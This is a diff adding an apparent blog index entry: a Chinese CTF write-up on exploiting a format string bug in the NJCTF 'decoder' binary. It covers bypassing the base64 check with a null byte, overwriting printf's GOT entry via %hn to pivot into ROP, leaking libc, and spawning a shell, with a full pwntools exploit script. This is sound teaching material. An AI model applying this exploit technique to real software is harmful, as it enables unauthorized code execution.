@@ -3,6 +3,48 @@
   
     
     <entry>
+      <title><![CDATA[格式化字符串漏洞利用实战]]></title>
+      <url>/2017/12/17/pwn_with_format_decoder.html</url>
+      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>格式化字符串漏洞也是一种比较常见的漏洞利用技术。<code>ctf</code> 中也经常出现。</p>
+<p>本文以 <code>njctf</code> 线下赛的一道题为例进行实战。</p>
+<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/decoder" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/decoder</a></p>
+<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序的流程如下</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134756777207wotnxfu.png?imageslim" alt="paste image"></p>
+<p>部分函数已经进行了标注，看程序打印出来的提示信息就知道这个是一个 <code>base64</code> 解码的程序，然后可以通过 <code>猜测 + 验证</code> 的方式，找到那个 用于 <code>base64</code> 解码的函数。</p>
+<p>这个程序的漏洞在于将 <code>base64</code> 解码后的字符串直接传入 <code>snprintf</code>, 作为 <code>format</code> 进行处理， 格式化漏洞。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134762004787vfa2tjp.png?imageslim" alt="paste image"></p>
+<p>通过格式化串可以 <strong>任意写/任意读</strong> ， 不过这里一次格式化之后就会往下一种走到程序末尾。所以这里我采用 修改 <code>printf got</code>的值 为 <code>rop gadgets</code>,然后进行 <code>rop</code>.</p>
+<p>还需要注意前面还有<code>check</code> ,不满足 <code>base64</code> 的格式规范的字符串是触发不了漏洞的。不过我们可以绕过这些 <code>check</code>。</p>
+<p>程序程序获取输入时使用的是 <code>read</code> 函数，然而后面的 <code>base64_check</code> 和 <code>base64_decode</code> 用到的输入的长度都是使用 <code>strlen</code> 获取的。<code>strlen</code> 是通过搜索 <code>\x00</code> 来确定字符串的长度， 而通过 <code>read</code> 我们可以输入 <code>\x00</code>， 所以我们在正常 <code>base64</code> 后面加上 <code>\x00</code> 然后布置 <code>rop chain</code> 即可。<br>还有一个小技巧，触发漏洞时 , <code>printf</code> 函数还没有被调用，所以 <code>got</code> 表中保存的值还是没有经过 <code>重绑定</code> 的值。</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513476750593syzw31hb.png?imageslim" alt="paste image"><br>为了绕过栈里面的 <code>base64</code> 字符串 ，我们需要一个 <code>add esp</code> 的 <code>gadgets</code> 可以使用 <code>ROPgadget</code>.</p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513476881379j7em7v3w.png?imageslim" alt="paste image"><br>找到一个 <code>0x08048b31</code>, 和 <code>printf</code>在 <code>got</code> 表中的值只有 <code>2</code>个字节的差距，所以使用 <code>%hn</code> 可以写两个字节，写的数据为 <code>0x8b31</code>,地址为 <code>0x0804B010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%35633c%7$hn</div></pre></td></tr></table></figure></p>
+<p>然后后面调用 <code>printf</code> 时就会进入 <code>rop chain</code>, 首先通过 <code>rop</code> 调用 <code>puts</code> 打印 <code>read@got</code> 泄露 <code>libc</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134770899859p7k76ct.png?imageslim" alt="paste image"></p>
+<p>然后再次触发漏洞，用刚刚 <code>leak</code>的数据，布置 <code>rop</code> 调用 <code>system(&#39;/bin/sh&#39;)</code></p>
+<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513477156821brdloq8e.png?imageslim" alt="paste image"></p>
+<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>对于 <code>strlen</code> 如果我们可以输入 <code>\x00</code>，则它的返回值我们是可以控制的。</p>
+<p>通过部分修改 <code>got</code>，执行 <code>rop</code>，要注意后面紧跟着调用的函数。</p>
+<p>最后的 <code>exp</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./decoder&quot;)</div><div class="line"></div><div class="line">gdb.attach(p, &apos;&apos;&apos;</div><div class="line">b *0x08048C29</div><div class="line"># b *0x08048C4E  </div><div class="line">b *0x08048b31</div><div class="line"># b *0x8048c5f  </div><div class="line">c</div><div class="line"></div><div class="line">	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">printf_got = 0x0804B010</div><div class="line">read_got = 0x0804B00C</div><div class="line"></div><div class="line">puts_plt = 0x08048520</div><div class="line"></div><div class="line">main_addr = 0x08048B37</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s = &apos;%35633c%7$hn&apos;</div><div class="line">payload = base64.b64encode(s)</div><div class="line">payload += &quot;\x00&quot;  # pass check</div><div class="line">payload += &quot;A&quot; * 3 # padding</div><div class="line">payload += p32(printf_got) # addr to write</div><div class="line"># payload += cyclic(40) # find ret eip offset</div><div class="line">payload += cyclic(28)   # padding for eip</div><div class="line"></div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(main_addr) # ret addr, ret to main, again</div><div class="line">payload += p32(0x0804B00C)  # addr to leak</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(&quot;THIS IS A SIMPLE BASE64 DECODER\n&quot;)</div><div class="line"></div><div class="line">read_addr = u32(p.recv(4))</div><div class="line">libc_addr = read_addr - 0xd5af0</div><div class="line">system_addr = libc_addr + 0x3ada0</div><div class="line">sh_addr = libc_addr + 1423787</div><div class="line"></div><div class="line">log.info(&quot;system: &quot; + hex(system_addr))</div><div class="line">log.info(&quot;/bin/sh: &quot; + hex(sh_addr))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s = &apos;%35633c%7$hn&apos;</div><div class="line">payload = base64.b64encode(s)</div><div class="line">payload += &quot;\x00&quot;  # pass check</div><div class="line">payload += &quot;A&quot; * 3 # padding</div><div class="line">payload += p32(printf_got) # addr to write</div><div class="line"># payload += cyclic(40) # find ret eip offset</div><div class="line">payload += cyclic(28)   # padding for eip</div><div class="line"></div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(main_addr) # ret addr, ret to main, again</div><div class="line">payload += p32(sh_addr)  # addr to leak</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
+      
+        <categories>
+            
+            <category> ctf </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> format string </tag>
+            
+            <tag> exploit </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[srop实战]]></title>
       <url>/2017/12/16/pwn_with_srop.html</url>
       <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>srop</code> 的作用比较强，在条件允许的情况下，尽量使用它。题目来自于 <code>i春秋</code>的一个比赛。</p>
